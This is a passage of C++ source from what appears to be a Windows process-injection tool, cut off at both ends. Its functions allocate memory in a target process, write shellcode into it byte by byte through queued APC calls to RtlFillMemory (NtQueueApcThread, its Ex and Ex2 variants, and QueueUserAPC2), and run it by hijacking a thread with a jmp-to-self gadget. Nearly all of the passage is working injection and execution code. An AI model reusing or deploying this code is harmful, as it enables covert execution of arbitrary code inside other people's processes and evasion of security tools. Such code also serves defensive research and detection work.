    ::Sleep(PostHijackWaitMs);

    // --- Cleanup ---
    CloseHandle(hThread);
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Hijack Primitive] Hijack sequence complete.\n";
    return true;
}

// --- Efficient Byte-by-Byte Memory Copy via NtQueueApcThreadEx2 ---
bool PerformRemoteMemoryCopyViaNtQueueApcThreadEx2(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pRtlFillMemory,
    LPVOID pRemoteDestBase,
    const unsigned char *sourceData,
    size_t dataSize,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    if (!pNtQueueApcThreadEx2 || !pRtlFillMemory || !pRemoteDestBase || !sourceData)
    {
        std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThreadEx2: Required function pointers are NULL!" << std::endl;
        return false;
    }
    if (config.verbose)
    {
        std::cout << "  [NtQAPCEx2 Copy Primitive] Starting byte-by-byte copy of " << dataSize << " bytes to " << pRemoteDestBase << " using NtQAPCEx2+Hijack(RtlMoveMemory)..." << std::endl;
        std::cout << "  [NtQAPCEx2 Copy Primitive] WARNING: This process will be very slow!" << std::endl;
    }
    DWORD64 remoteDestBaseAddr = reinterpret_cast<DWORD64>(pRemoteDestBase);
    for (size_t i = 0; i < dataSize; ++i)
    {
        char targetChar = static_cast<char>(sourceData[i]);
        BYTE byteToWrite = sourceData[i]; // Get the byte value directly from the source buffer for memset/RtlFillMemory
        // Cast pRemoteDestBase to BYTE* for pointer arithmetic
        DWORD64 destinationAddressByte = reinterpret_cast<DWORD64>(
            static_cast<BYTE *>(pRemoteDestBase) + i);
        if ((i == 0 || (i + 1) % 20 == 0 || i == dataSize - 1))
        { // Log progress
            std::cout << "  [NtQAPCEx2 Copy Primitive] Copying byte " << i + 1 << "/" << dataSize << std::endl;
        }

        // -- test if can just apc --
        DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_GET_CONTEXT;
        if (config.useSuspend)
        {
            dwThreadDesiredAccess |= THREAD_SUSPEND_RESUME;
        }
        HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
        NTSTATUS status = pNtQueueApcThreadEx2(
            hThread,
            NULL,                            // User APC reserve handle (NULL for normal)
            (ULONG)1,                        // apc_special_user_apc
            (PPS_APC_ROUTINE)pRtlFillMemory, // APC Routine memset
            (PVOID)destinationAddressByte,   // ApcArgument1 memset dst
            (PVOID)1,                        // ApcArgument2 memset length
            (PVOID)byteToWrite               // ApcArgument3 memset value
        );

        if (status != STATUS_SUCCESS)
        {
            std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcEx2Hijack pNtQueueApcThreadEx2: NtQueueApcThreadEx2 failed. NTSTATUS: 0x" << std::hex << status << std::dec << std::endl;
            CloseHandle(hThread);
            return false;
        }
        if (config.verbose)
            std::cout << "  [NtQAPCEx2 Hijack Primitive] NtQueueApcThreadEx2 call successful.\n";
        continue;

        // -- end test --

        // Use the *new* NtQueueApcEx hijack primitive
        // RtlMoveMemory takes 3 arguments (Destination, Source, Length)
        // These map to arg1, arg2, arg3 passed to the hijack primitive
        bool hijackSuccess = ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack(
            hProcess,
            config,
            pRtlFillMemory,         // Target function = RtlFillMemory
            destinationAddressByte, // Arg1 (RCX): Destination address for this byte
            1,                      // Arg2 (RDX): Length (1 byte)
            (DWORD64)byteToWrite,   // Arg3 (R8): Fill byte value
            0,                      // Arg4 (R9): Unused
            pSleep,
            loopGadgetAddr);
        if (!hijackSuccess)
        {
            std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThreadEx2: Hijack sequence failed for byte " << i << "." << std::endl;
            return false;
        }
    }
    if (config.verbose)
        std::cout << "  [NtQAPCEx2 Copy Primitive] Successfully completed copy." << std::endl;
    return true;
}

// --- Byte-by-Byte Memory Copy via NtQueueApcEx Hijack ---
bool PerformRemoteMemoryCopyViaNtQueueApcExHijack(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pRtlFillMemory,
    LPVOID pRemoteDestBase,
    const unsigned char *sourceData,
    size_t dataSize,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    if (!pRtlFillMemory || !pRemoteDestBase || !sourceData || !pSleep || !loopGadgetAddr)
    { /* error */
        return false;
    }
    if (config.verbose)
    {
        std::cout << "  [NtQAPCEx Copy Primitive] Starting byte-by-byte copy of " << dataSize << " bytes to " << pRemoteDestBase << " using NtQAPCEx+Hijack(RtlMoveMemory)..." << std::endl;
        std::cout << "  [NtQAPCEx Copy Primitive] WARNING: This process will be very slow!" << std::endl;
    }

    DWORD64 remoteDestBaseAddr = reinterpret_cast<DWORD64>(pRemoteDestBase);

    for (size_t i = 0; i < dataSize; ++i)
    {
        char targetChar = static_cast<char>(sourceData[i]);
        BYTE byteToWrite = sourceData[i]; // Get the byte value directly from the source buffer for memset/RtlFillMemory

        // Cast pRemoteDestBase to BYTE* for pointer arithmetic
        DWORD64 destinationAddressByte = reinterpret_cast<DWORD64>(
            static_cast<BYTE *>(pRemoteDestBase) + i);

        // LPVOID remoteByteAddress = FindCharInRemoteProcess(hProcess, targetChar);
        // if (remoteByteAddress == nullptr) { /* error */ return false; }

        std::cout << "  [NtQAPCEx Copy Primitive] Copying byte " << i + 1 << "/" << dataSize << std::endl;

        // -- test --
        DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_GET_CONTEXT;
        if (config.useSuspend)
        {
            dwThreadDesiredAccess |= THREAD_SUSPEND_RESUME;
        }
        HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
        NTSTATUS status = pNtQueueApcThreadEx(
            hThread,
            (HANDLE)1,                       // apc_special_user_apc
            (PPS_APC_ROUTINE)pRtlFillMemory, // APC Routine
            (PVOID)destinationAddressByte,   // ApcArgument1 (Sleep's dwMilliseconds)
            (PVOID)1,                        // ApcArgument2
            (PVOID)byteToWrite               // ApcArgument3
        );

        if (status != STATUS_SUCCESS)
        {
            std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcExHijack pNtQueueApcThreadEx: NtQueueApcThreadEx failed. NTSTATUS: 0x" << std::hex << status << std::dec << std::endl;
            CloseHandle(hThread);
            return false;
        }
        if (config.verbose)
            std::cout << "  [NtQAPCEx Hijack Primitive] NtQueueApcThreadEx call successful.\n";
        continue;

        // -- end test --

        // Use the *new* NtQueueApcEx hijack primitive
        // RtlMoveMemory takes 3 arguments (Destination, Source, Length)
        // These map to arg1, arg2, arg3 passed to the hijack primitive
        bool hijackSuccess = ExecuteRemoteFunctionViaNtQueueApcExHijack(
            hProcess,
            config,
            pRtlFillMemory,         // Target function = RtlFillMemory
            destinationAddressByte, // Arg1 (RCX): Destination address for this byte
            1,                      // Arg2 (RDX): Length (1 byte)
            (DWORD64)byteToWrite,   // Arg3 (R8): Fill byte value
            0,                      // Arg4 (R9): Unused
            pSleep,
            loopGadgetAddr);

        if (!hijackSuccess)
        {
            std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcExHijack: Hijack sequence failed for byte " << i << "." << std::endl;
            return false;
        }
    }
    if (config.verbose)
        std::cout << "  [NtQAPCEx Copy Primitive] Successfully completed copy." << std::endl;
    return true;
}

// --- Efficient Byte-by-Byte Memory Copy via NtQueueApcThread ---
bool PerformRemoteMemoryCopyViaNtQueueApcThread(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pRtlFillMemory,
    LPVOID pRemoteDestBase,
    const unsigned char *sourceData,
    size_t dataSize,
    LPVOID pSleep)
{
    if (!pNtQueueApcThread || !pRtlFillMemory || !pRemoteDestBase || !sourceData)
    {
        std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThread: Invalid arguments provided." << std::endl;
        return false;
    }

    if (config.targetTid == 0)
    {
        std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThread: Target thread ID is required." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "  [NtQueueApcThread Copy] Starting byte-by-byte copy of " << dataSize
                  << " bytes to " << pRemoteDestBase << " using direct NtQueueApcThread..." << std::endl;
        std::cout << "  [NtQueueApcThread Copy] This will queue one APC for each byte." << std::endl;
    }

    // Open thread with appropriate access rights
    DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT;
    HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
    if (!hThread)
    {
        std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThread: OpenThread failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Queue APCs to write each byte
    const size_t logInterval = dataSize > 100 ? dataSize / 10 : 10; // Log every 10% or every 10 bytes
    bool warnedAboutWait = false;

    for (size_t i = 0; i < dataSize; ++i)
    {
        // Calculate destination address for this byte
        DWORD64 destinationAddressByte = reinterpret_cast<DWORD64>(
            static_cast<BYTE *>(pRemoteDestBase) + i);
        BYTE byteToWrite = sourceData[i];

        // Log progress periodically
        if (config.verbose)
        {
            std::cout << "  [NtQueueApcThread Copy] Queueing byte " << i + 1 << "/" << dataSize
                      << " (0x" << std::hex << static_cast<int>(byteToWrite) << std::dec << ")" << std::endl;
        }
        else if ((i == 0 || i == dataSize - 1 || i % logInterval == 0))
        {
            std::cout << "  [NtQueueApcThread Copy] Queueing byte " << i + 1 << "/" << dataSize
                      << " (0x" << std::hex << static_cast<int>(byteToWrite) << std::dec << ")" << std::endl;
        }

        // Queue APC for RtlFillMemory
        // Note: Regular NtQueueApcThread has only the first parameter (PVOID)
        // We need to use the Windows x64 calling convention parameters since we'll execute directly
        // RtlFillMemory(Dest, Length, Value)
        // For x64: RCX = Dest, RDX = Length, R8 = Value

        NTSTATUS status = pNtQueueApcThread(
            hThread,                         // Thread handle
            (PPS_APC_ROUTINE)pRtlFillMemory, // Target function (RtlFillMemory)
            (PVOID)destinationAddressByte,   // Arg1: destination address (RCX)
            (PVOID)1,                        // Arg2: length of 1 byte (RDX)
            (PVOID)(DWORD64)byteToWrite      // Arg3: fill value (R8)
        );

        if (status != STATUS_SUCCESS)
        {
            std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThread: NtQueueApcThread failed for byte " << i
                      << ". NTSTATUS: 0x" << std::hex << status << std::dec << std::endl;
            CloseHandle(hThread);
            return false;
        }
    }

    // Since regular APCs (without special flag) will only be processed when the thread enters an alertable state,
    // we need to either wait for the thread to do this naturally, or force it with a NtAlertThread / Alertable wait (eg. SleepEx/NtTestAlert) via SPECIAL_APC)
    if (config.verbose)
    {
        std::cout << "  [NtQueueApcThread Copy] Successfully queued " << dataSize << " APCs for byte writing." << std::endl;
        std::cout << "  [NtQueueApcThread Copy] APCs will be processed when thread enters an alertable state." << std::endl;
    }

    // Sleep for a short time to allow the thread to process the queued APCs
    if (config.verbose)
        std::cout << "  [NtQueueApcThread Copy] Sleeping briefly to allow APC processing..." << std::endl;
    ::Sleep(150);

    CloseHandle(hThread);
    return true;
}

// --- Orchestrator for NtQueueApcThreadEx ---
bool InjectShellcodeUsingNtQueueApcEx( // Definition Added
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    const InjectionConfig &config)
{
    if (config.contextMethod != ContextMethod::TWO_STEP)
    {
        std::cerr << "[!] InjectShellcodeUsingAPC currently only supports '--context-method two-step'." << std::endl;
        // Optionally fall back to a simpler method or just fail.
        // For now, we fail if the context isn't two-step.
        // We could implement the direct QueueUserAPC(shellcode) here under a different context method if needed.
        return false;
    }

    if (config.targetTid == 0)
    {
        std::cerr << "[!] QueueUserAPC (two-step) method requires a target thread ID (--tid)." << std::endl;
        return false;
    }

    if (shellcodeBytes.empty())
    {
        std::cerr << "[!] No shellcode provided to inject." << std::endl;
        return false;
    }

    // Get necessary function addresses
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32)
    {
        std::cerr << "[!] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pRtlMoveMemory = GetProcAddress(hKernel32, "RtlMoveMemory");
    LPVOID pRtlFillMemory = GetProcAddress(hKernel32, "RtlFillMemory");
    // LPVOID pRtlFillMemory = ::pRtlFillMemory; // Use the global pointer
    LPVOID pSleep = GetProcAddress(hKernel32, "Sleep");
    LPVOID loopGadgetAddr = nullptr;

    std::cout << "[*] Searching for local loop gadget (EB FE) in ntdll.dll..." << std::endl;
    std::vector<BYTE> loopGadgetBytes = {0xEB, 0xFE}; // jmp short -2
    loopGadgetAddr = FindLocalGadgetInRX("ntdll.dll", loopGadgetBytes, config.verbose);

    if (config.verbose)
    {
        std::cout << "[*] Using two-step APC hijack context method." << std::endl;
        std::cout << "[*] Target TID: " << config.targetTid << std::endl;
        std::cout << "[*] Required addresses:"
                  << "\n    VirtualAlloc: " << pVirtualAlloc
                  << "\n    RtlMoveMemory: " << pRtlMoveMemory
                  << "\n    RtlFillMemory: " << pRtlFillMemory
                  << "\n    Sleep: " << pSleep
                  << "\n    Loop Gadget: " << loopGadgetAddr << std::endl;
    }
    if (!pVirtualAlloc || !pRtlFillMemory || !pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] Failed to get necessary function addresses. Error: " << GetLastError() << std::endl;
        return false;
    }

    // --- Injection Steps ---

    // 1. Allocate memory in the target process for the shellcode
    DWORD64 ALLOC_SIZE = config.allocSize;
    DWORD64 ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE;
    DWORD64 ALLOC_PROTECT = config.allocPerm;
    DWORD64 REQUESTED_ALLOC_ADDR = config.allocAddress ? config.allocAddress : 0x60000;
    LPVOID pRemoteMemory = (LPVOID)REQUESTED_ALLOC_ADDR;

    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 1: Allocating Memory ---" << std::endl;
        std::cout << "[*] Attempting to call VirtualAlloc via APC+Hijack" << std::endl;
        std::cout << "[*] Requested Address: " << pRemoteMemory << " (Assumed)" << std::endl;
        std::cout << "[*] Size: " << ALLOC_SIZE << " bytes" << std::endl;
        std::cout << "[*] Permissions: 0x" << std::hex << ALLOC_PROTECT << std::dec << std::endl;
    }

    bool allocSuccess = ExecuteRemoteFunctionViaNtQueueApcExHijack(
        hProcess,
        config,
        pVirtualAlloc,
        REQUESTED_ALLOC_ADDR, // RCX: lpAddress (REQUESTED)
        ALLOC_SIZE,           // RDX: dwSize
        ALLOC_TYPE,           // R8:  flAllocationType
        ALLOC_PROTECT,        // R9:  flProtect
        pSleep,               // Sleep function address
        loopGadgetAddr        // Loop Gadget address
    );

    if (!allocSuccess)
    {
        std::cerr << "[!] Failed to execute VirtualAlloc call via APC+Hijack." << std::endl;
        // No memory to free here as we don't know if it was allocated
        return false;
    }

    // We *assume* allocation succeeded at pRemoteMemory. A check could involve
    // trying to ReadProcessMemory from pRemoteMemory, but even that isn't foolproof.
    if (config.verbose)
    {
        std::cout << "[+] VirtualAlloc call executed via hijack (Assumed success at " << pRemoteMemory << ")." << std::endl;
    }

    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 2: Writing Shellcode (Byte-by-Byte via Hijack) ---" << std::endl;
        std::cout << "[*] This step will be very slow. Please be patient." << std::endl;
    }

    // 2. Write Shellcode using PerformRemoteMemoryCopyViaNtQueueApcExHijack
    bool copySuccess = PerformRemoteMemoryCopyViaNtQueueApcExHijack(
        hProcess,
        config,
        pRtlFillMemory,        // Pass RtlMoveMemory address
        pRemoteMemory,         // Destination base address
        shellcodeBytes.data(), // Source shellcode buffer
        shellcodeBytes.size(), // Source shellcode size
        pSleep,                // Pass Sleep address
        loopGadgetAddr         // Pass Gadget address
    );

    if (!copySuccess)
    {
        std::cerr << "[!] Failed during byte-by-byte shellcode copy via APC+Hijack." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE); // Attempt cleanup
        return false;
    }
    if (config.verbose)
    {
        std::cout << "[+] Shellcode copy via hijack completed." << std::endl;
    }

    // 3. Execute Shellcode using the Hijack Primitive
    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 3: Executing Shellcode (Direct Jump via Hijack) ---" << std::endl;
        std::cout << "[*] Attempting to jump to shellcode at " << pRemoteMemory << " via APC+Hijack" << std::endl;
    }

    // Hijack directly into the shellcode address, we could add more triggers here like callback registrations etc,
    // if we want to free the thread executing the apc without relying on the shellcode.
    bool execSuccess = ExecuteRemoteFunctionViaNtQueueApcExHijack(
        hProcess, config,
        pRemoteMemory, // Target function is the shellcode itself
        0, 0, 0, 0,    // Args (usually none needed for shellcode entry)
        pSleep,        // Pass Sleep pointer
        loopGadgetAddr // Pass Gadget pointer
    );

    if (!execSuccess)
    {
        std::cerr << "[!] Failed to execute shellcode call via APC+Hijack." << std::endl;
        // Don't free here, shellcode might be partially running or needed
        // VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE); // Maybe attempt cleanup? Risky.
        return false;
    }
    if (config.verbose)
    {
        std::cout << "[+] Shellcode execution triggered via hijack." << std::endl;
    }

    return true; // Success means all steps initiated
}

bool InjectShellcodeUsingQueueUserAPC2(
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    const InjectionConfig &config)
{
    if (config.contextMethod != ContextMethod::TWO_STEP)
    {
        std::cerr << "[!] QueueUserAPC2 injection currently only supports '--context-method two-step'." << std::endl;
        return false;
    }
    if (config.targetTid == 0)
    {
        std::cerr << "[!] QueueUserAPC2 method requires a target thread ID (--tid)." << std::endl;
        return false;
    }
    if (shellcodeBytes.empty())
    {
        std::cerr << "[!] No shellcode provided to inject." << std::endl;
        return false;
    }
    if (!pQueueUserAPC2)
    {
        std::cerr << "[!] QueueUserAPC2 function is not available on this system (requires Windows 10 build 1809+)." << std::endl;
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32)
    {
        std::cerr << "[!] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        return false;
    }
    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pRtlFillMemory = GetProcAddress(hKernel32, "RtlFillMemory");
    LPVOID pSleep = GetProcAddress(hKernel32, "Sleep");
    std::vector<BYTE> loopGadgetBytes = {0xEB, 0xFE};
    LPVOID loopGadgetAddr = FindLocalGadgetInRX("ntdll.dll", loopGadgetBytes, config.verbose);

    DWORD64 ALLOC_SIZE = config.allocSize;
    DWORD64 ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE;
    DWORD64 ALLOC_PROTECT = config.allocPerm;
    DWORD64 REQUESTED_ALLOC_ADDR = config.allocAddress ? config.allocAddress : 0x60000;
    LPVOID pRemoteMemory = (LPVOID)REQUESTED_ALLOC_ADDR;

    // 1. Allocate memory
    if (!ExecuteRemoteFunctionViaQueueUserAPC2Hijack(
            hProcess, config, pVirtualAlloc,
            REQUESTED_ALLOC_ADDR, ALLOC_SIZE, ALLOC_TYPE, ALLOC_PROTECT,
            pSleep, loopGadgetAddr))
    {
        std::cerr << "[!] VirtualAlloc via QueueUserAPC2 hijack failed." << std::endl;
        return false;
    }

    // 2. Write shellcode byte-by-byte
    for (size_t i = 0; i < shellcodeBytes.size(); ++i)
    {
        BYTE byteToWrite = shellcodeBytes[i];
        DWORD64 destinationAddressByte = reinterpret_cast<DWORD64>(
            static_cast<BYTE *>(pRemoteMemory) + i);

        if (config.verbose)
        {
            std::cout << "  [Copy Primitive] Copying byte " << i + 1 << "/" << shellcodeBytes.size() << " (Value: 0x" << std::hex << static_cast<int>(byteToWrite) << std::dec << ")" << std::endl;
        }

        if (!ExecuteRemoteFunctionViaQueueUserAPC2Hijack(
                hProcess, config, pRtlFillMemory,
                destinationAddressByte, 1, (DWORD64)byteToWrite, 0,
                pSleep, loopGadgetAddr))
        {
            std::cerr << "[!] RtlFillMemory via QueueUserAPC2 hijack failed at byte " << i << std::endl;
            return false;
        }
    }

    // 3. Execute shellcode
    if (!ExecuteRemoteFunctionViaQueueUserAPC2Hijack(
            hProcess, config, pRemoteMemory,
            0, 0, 0, 0,
            pSleep, loopGadgetAddr))
    {
        std::cerr << "[!] Shellcode execution via QueueUserAPC2 hijack failed." << std::endl;
        return false;
    }

    return true;
}

// --- Orchestrator for NtQueueApcThread ---
bool InjectShellcodeUsingNtQueueApcThread(
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    const InjectionConfig &config)
{
    if (config.contextMethod != ContextMethod::TWO_STEP)
    {
        std::cerr << "[!] InjectShellcodeUsingNtQueueApcThread currently only supports '--context-method two-step'." << std::endl;
        return false;
    }

    if (config.targetTid == 0)
    {
        std::cerr << "[!] NtQueueApcThread method requires a target thread ID (--tid)." << std::endl;
        return false;
    }

    if (shellcodeBytes.empty())
    {
        std::cerr << "[!] No shellcode provided to inject." << std::endl;
        return false;
    }

    // Check for required API
    if (!pNtQueueApcThread)
    {
        std::cerr << "[!] NtQueueApcThread function pointer is NULL!" << std::endl;
        return false;
    }

    // Get necessary function addresses
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32)
    {
        std::cerr << "[!] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pRtlFillMemory = GetProcAddress(hKernel32, "RtlFillMemory");
    LPVOID pSleep = GetProcAddress(hKernel32, "Sleep");
    std::vector<BYTE> loopGadgetBytes = {0xEB, 0xFE};
    LPVOID loopGadgetAddr = FindLocalGadgetInRX("ntdll.dll", loopGadgetBytes, config.verbose);

    if (config.verbose)
    {
        std::cout << "[*] Using two-step NtQueueApcThread hijack method." << std::endl;
        std::cout << "[*] Target TID: " << config.targetTid << std::endl;
        std::cout << "[*] Required addresses:" << std::endl;
        std::cout << "    VirtualAlloc: " << pVirtualAlloc << std::endl;
        std::cout << "    RtlFillMemory: " << pRtlFillMemory << std::endl;
        std::cout << "    Sleep: " << pSleep << std::endl;
        std::cout << "    Loop Gadget: " << loopGadgetAddr << std::endl;
    }

    if (!pVirtualAlloc || !pRtlFillMemory || !pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] Failed to get necessary function addresses." << std::endl;
        return false;
    }

    // --- Injection Steps ---

    // 1. Allocate memory in the target process for the shellcode
    DWORD64 ALLOC_SIZE = config.allocSize;
    DWORD64 ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE;
    DWORD64 ALLOC_PROTECT = config.allocPerm;
    DWORD64 REQUESTED_ALLOC_ADDR = config.allocAddress ? config.allocAddress : 0x60000;
    LPVOID pRemoteMemory = (LPVOID)REQUESTED_ALLOC_ADDR;

    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 1: Allocating Memory ---" << std::endl;
        std::cout << "[*] Attempting to call VirtualAlloc via NtQueueApcThread+Hijack" << std::endl;
        std::cout << "[*] Requested Address: 0x" << std::hex << REQUESTED_ALLOC_ADDR << std::dec << std::endl;
        std::cout << "[*] Size: " << ALLOC_SIZE << " bytes" << std::endl;
        std::cout << "[*] Permissions: 0x" << std::hex << ALLOC_PROTECT << std::dec << std::endl;
    }

    // Call VirtualAlloc via NtQueueApcThread+Hijack
    bool allocSuccess = ExecuteRemoteFunctionViaNtQueueApcThread(
        hProcess,
        config,
        pVirtualAlloc,
        REQUESTED_ALLOC_ADDR, // RCX: lpAddress (REQUESTED)
        ALLOC_SIZE,           // RDX: dwSize
        ALLOC_TYPE,           // R8:  flAllocationType
        ALLOC_PROTECT,        // R9:  flProtect
        pSleep,               // Sleep function address
        loopGadgetAddr        // Loop Gadget address
    );

    if (!allocSuccess)
    {
        std::cerr << "[!] Failed to execute VirtualAlloc call via NtQueueApcThread+Hijack." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "[+] VirtualAlloc call executed (Assumed success at " << pRemoteMemory << ")." << std::endl;
    }

    // 2. Write Shellcode using PerformRemoteMemoryCopyViaNtQueueApcThread
    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 2: Writing Shellcode (Byte-by-Byte via NtQueueApcThread) ---" << std::endl;
        std::cout << "[*] This will queue one APC for each byte. Please be patient." << std::endl;
    }

    bool copySuccess = PerformRemoteMemoryCopyViaNtQueueApcThread(
        hProcess,
        config,
        pRtlFillMemory,        // RtlFillMemory function
        pRemoteMemory,         // Destination base address
        shellcodeBytes.data(), // Source shellcode buffer
        shellcodeBytes.size(), // Source shellcode size
        pSleep                 // Sleep function
    );

    if (!copySuccess)
    {
        std::cerr << "[!] Failed during byte-by-byte shellcode copy via NtQueueApcThread." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "[+] Shellcode copy via NtQueueApcThread completed." << std::endl;
    }

    // 3. Execute Shellcode using our hijack primitive
    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 3: Executing Shellcode via NtQueueApcThread+Hijack ---" << std::endl;
        std::cout << "[*] Attempting to jump to shellcode at " << pRemoteMemory << std::endl;
    }

    bool execSuccess = ExecuteRemoteFunctionViaNtQueueApcThread(
        hProcess,
        config,
        pRemoteMemory, // Target function is the shellcode
        0, 0, 0, 0,    // No arguments for shellcode
        pSleep,        // Sleep function
        loopGadgetAddr // Loop gadget
    );

    if (!execSuccess)
    {
        std::cerr << "[!] Failed to execute shellcode via NtQueueApcThread+Hijack." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "[+] Shellcode execution triggered." << std::endl;
    }

    return true;
}

// --- Byte-by-Byte Memory Copy via NtQueueApcThreadEx2 ---
bool PerformRemoteMemoryCopyViaNtQueueApcThreadEx2Hijack(
    HANDLE hProcess,
    const InjectionConfig &config,
    LPVOID pRtlFillMemory,
    LPVOID pRemoteDestBase,
    const unsigned char *sourceData,
    size_t dataSize,
    LPVOID pSleep,
    LPVOID loopGadgetAddr)
{
    if (!pRtlFillMemory || !pRemoteDestBase || !sourceData || !pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThreadEx2Hijack: Invalid arguments provided." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "  [NtQueueApcThreadEx2 Copy] Starting byte-by-byte copy of " << dataSize
                  << " bytes to " << pRemoteDestBase << " using NtQueueApcThreadEx2+Hijack..." << std::endl;
        std::cout << "  [NtQueueApcThreadEx2 Copy] WARNING: This process will be very slow!" << std::endl;
    }

    // We can use either direct NtQueueApcThreadEx2 calls for each byte (faster)
    // or use the hijack primitive for each byte (slower but more reliable)
    const bool useDirectApcCalls = true; // Set to false if you want to use hijack for each byte

    if (useDirectApcCalls)
    {
        // Open thread once for all operations
        DWORD dwThreadDesiredAccess = THREAD_SET_CONTEXT;
        HANDLE hThread = OpenThread(dwThreadDesiredAccess, FALSE, config.targetTid);
        if (!hThread)
        {
            std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThreadEx2Hijack: OpenThread failed. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        // Queue APCs for each byte directly
        for (size_t i = 0; i < dataSize; ++i)
        {
            BYTE byteToWrite = sourceData[i];
            DWORD64 destinationAddressByte = reinterpret_cast<DWORD64>(
                static_cast<BYTE *>(pRemoteDestBase) + i);

            if ((i == 0 || (i + 1) % 20 == 0 || i == dataSize - 1))
            {
                std::cout << "  [NtQueueApcThreadEx2 Copy] Copying byte " << i + 1 << "/" << dataSize << std::endl;
            }

            NTSTATUS status = pNtQueueApcThreadEx2(
                hThread,
                NULL,                            // User APC reserve handle (NULL for normal)
                (ULONG)1,                        // Special user APC flag (1 = special, force delivery)
                (PPS_APC_ROUTINE)pRtlFillMemory, // APC Routine
                (PVOID)destinationAddressByte,   // Arg1: destination address
                (PVOID)1,                        // Arg2: length of 1 byte
                (PVOID)(DWORD64)byteToWrite      // Arg3: fill value
            );

            if (status != STATUS_SUCCESS)
            {
                std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThreadEx2Hijack: NtQueueApcThreadEx2 failed for byte " << i
                          << ". NTSTATUS: 0x" << std::hex << status << std::dec << std::endl;
                CloseHandle(hThread);
                return false;
            }
        }

        CloseHandle(hThread);
    }
    else
    {
        // Use the hijack primitive for each byte (slower but more reliable)
        for (size_t i = 0; i < dataSize; ++i)
        {
            BYTE byteToWrite = sourceData[i];
            DWORD64 destinationAddressByte = reinterpret_cast<DWORD64>(
                static_cast<BYTE *>(pRemoteDestBase) + i);

            if (config.verbose && (i == 0 || (i + 1) % 10 == 0 || i == dataSize - 1))
            {
                std::cout << "  [NtQueueApcThreadEx2 Copy] Copying byte " << i + 1 << "/" << dataSize
                          << " (Value: 0x" << std::hex << static_cast<int>(byteToWrite) << std::dec << ")" << std::endl;
            }

            bool hijackSuccess = ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack(
                hProcess,
                config,
                pRtlFillMemory,         // Target function = RtlFillMemory
                destinationAddressByte, // Arg1: Destination address for this byte
                1,                      // Arg2: Length (1 byte)
                (DWORD64)byteToWrite,   // Arg3: Fill byte value
                0,                      // Arg4: Unused
                pSleep,
                loopGadgetAddr);

            if (!hijackSuccess)
            {
                std::cerr << "[!] PerformRemoteMemoryCopyViaNtQueueApcThreadEx2Hijack: Failed for byte " << i << "." << std::endl;
                return false;
            }
        }
    }

    if (config.verbose)
    {
        std::cout << "  [NtQueueApcThreadEx2 Copy] Successfully completed copy of " << dataSize << " bytes." << std::endl;
    }

    return true;
}

// --- Orchestrator for NtQueueApcThreadEx2 ---
bool InjectShellcodeUsingNtQueueApcThreadEx2(
    HANDLE hProcess,
    const std::vector<unsigned char> &shellcodeBytes,
    const InjectionConfig &config)
{
